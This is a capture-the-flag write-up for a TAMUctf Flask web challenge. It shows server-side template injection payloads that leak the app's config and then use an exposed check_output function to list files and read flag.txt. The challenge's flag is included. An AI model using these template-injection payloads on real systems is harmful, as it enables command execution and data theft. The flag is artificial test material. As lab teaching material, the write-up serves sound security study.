# Science!
Web

## Challenge 

http://web3.tamuctf.com

Difficulty: medium

## Solution

We see this on the page

	Welcome to my new FaaS! (Flask as a Service)
	Please enter the two chemicals you would like to combine:
	Chemical One: [textbox]
	Chemical Two: [textbox]

	[Submit button]

Entering `HELLO` and `WORLD`, I get this upon submitting

	The result of combining HELLO and WORLD is:
	[GIF image]

### Flask injection

Let's try the common Flask injection, I'll submit `{{config}}`

	The result of combining 
	<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'RUNCMD': <function check_output at 0x7f5f55696668>, 'SESSION_REFRESH_EACH_REQUEST': True, 'LOGGER_HANDLER_POLICY': 'always', 'LOGGER_NAME': 'tamuctf', 'DEBUG': False, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'SECERT_KEY': 'super-secret', 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': None, 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': True, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PROPAGATE_EXCEPTIONS': None, 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'WFT_CSRF_ENABLED': True, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_SECURE': False, 'TRAP_HTTP_EXCEPTIONS': False}>
	and TEST is:

---

We see a suspicious entry `'RUNCMD': <function check_output at 0x7f5f55696668>`.

Select it by submitting `{{ config['RUNCMD'] }}`

	The result of combining <function check_output at 0x7f5f55696668> and TEST is:

---

List out the file directory: `{{ config['RUNCMD']('ls') }}`

	The result of combining 
	config.py entry.sh flag.txt requirements.txt serve.py tamuctf
	and TEST is:

Cat out the flag: `{{ config['RUNCMD']('cat flag.txt') }}`

	Something went wrong

Hmm, there is something wrong with our command. 

Notice that the python check_output() is being used... So we must pass the parameters as a list

Submit: `{{ config['RUNCMD'](['cat', 'flag.txt']) }}`

	The result of combining gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}
	  and  is:

## Flag

	gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}
